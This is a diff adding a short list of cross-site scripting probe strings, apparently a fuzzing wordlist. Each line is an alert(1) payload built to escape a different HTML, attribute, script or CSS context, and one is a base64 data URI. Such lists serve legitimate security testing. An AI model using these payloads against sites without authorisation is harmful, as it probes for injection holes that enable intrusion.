@@ -1,0 +1,15 @@
+\r\n\r\n<script>alert(1)</script>
+</textarea><script>alert(1)</script>//
+'"><script>alert(1)</script>
+<img/src=@ onerror=alert(1)/>
+'"><img/src=@ onerror=alert(1)/>
+' onmouseover=alert(1) x='
+" onmouseover=alert(1) x="
+` onmouseover=alert(1) x=`
+javascript:alert(1)//
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXBOPg==
+'";alert(1)//
+</script><script>alert(1)//
+}x:expression(alert(1))
+alert(1)//
+*/-->'"></iframe></script></style></title></textarea></xmp></noscript></noframes></plaintext><script>alert(1)</script>
